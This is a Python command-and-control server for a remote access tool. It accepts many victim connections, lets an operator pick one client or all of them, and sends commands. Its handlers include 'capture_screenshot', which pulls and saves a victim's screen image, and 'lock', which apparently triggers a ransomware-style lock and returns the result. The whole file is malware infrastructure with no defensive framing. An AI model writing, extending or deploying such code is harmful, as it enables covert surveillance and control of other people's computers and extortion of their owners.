import socket
import os
from datetime import datetime as dt
import base64
import zlib
import time
import sys
import threading

IP = sys.argv[1]
PORT = int(sys.argv[2])
active = True
clients = {}  # Dictionary to store client connections and their info

# Set up the socket
sock = socket.socket()
sock.bind((IP, PORT))
sock.listen(5)
print("Server listening for incoming connections...")

# Compress data
def zdecomp(data):
    """ Decompress the received data. """
    try:
        return zlib.decompress(data)
    except Exception as e:
        print(f"Error decompressing data: {e}")
        return b""

# Handle individual client connection
def handle_client_connection(conn, addr):
    print(f"{addr} has connected.")
    try:
        while active:
            try:
                command = input("[+] Enter command: ")
                if len(command) < 1:
                    print("No command ..")
                    return

                if command == "lock":
                    conn.send(command.encode())
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    enc = conn.recv(fsize)
                    print(zdecomp(enc).decode("utf-8"))

                elif command == "capture_screenshot":
                    conn.send(command.encode())
                    print("receiving file size ...")
                    fsize = int(zdecomp(conn.recv(1024)).decode("utf-8"))
                    print("File Size: ", fsize)
                    enc = conn.recv(fsize)
                    dec = zdecomp(enc)
                    filename = str(dt.now()).replace(":", "-") + ".png"
                    with open(filename, 'wb') as save:
                        save.write(dec)
                    print(f"Saved to {filename}")

                # Add more command handling as required here...

            except ConnectionError as e:
                print(f"Error during command execution: {e}")
                break

    except Exception as e:
        print(f"Error handling client connection: {e}")
    finally:
        conn.close()
        del clients[addr]  # Remove client from the list when they disconnect
        print(f"Connection with {addr} closed.")

# Accept multiple clients concurrently
def accept_clients():
    while True:
        conn, addr = sock.accept()
        clients[addr] = conn  # Store the connection object and address
        print(f"New connection: {addr}")
        client_thread = threading.Thread(target=handle_client_connection, args=(conn, addr))
        client_thread.daemon = True  # Daemonize thread so it ends when the main program exits
        client_thread.start()

# List clients and select one to interact with
def list_and_select_client():
    while True:
        print("\n[+] Active clients:")
        for idx, addr in enumerate(clients.keys()):
            print(f"{idx + 1}. {addr}")
        
        try:
            selection = int(input("\nSelect client by number or enter 0 to send to all clients: "))
            if selection == 0:
                return None
            elif 1 <= selection <= len(clients):
                selected_client = list(clients.keys())[selection - 1]
                print(f"Selected client: {selected_client}")
                return selected_client
            else:
                print("Invalid selection, try again.")
        except ValueError:
            print("Please enter a valid number.")

def send_command_to_client(command, client_addr=None):
    if client_addr is None:
        # Send to all clients
        for conn in clients.values():
            conn.send(command.encode())
    else:
        conn = clients.get(client_addr)
        if conn:
            conn.send(command.encode())
        else:
            print(f"No client found with address {client_addr}")

# To handle reconnection attempts and socket failures
def reconnect_server():
    while True:
        try:
            accept_clients()
        except Exception as e:
            print(f"Error: {e}, retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    # Start handling the client connections
    accept_thread = threading.Thread(target=reconnect_server)
    accept_thread.start()

    while active:
        selected_client = list_and_select_client()
        if selected_client:
            command = input("[+] Enter command to send to selected client: ")
            send_command_to_client(command, selected_client)
        else:
            command = input("[+] Enter command to send to all clients: ")
            send_command_to_client(command)
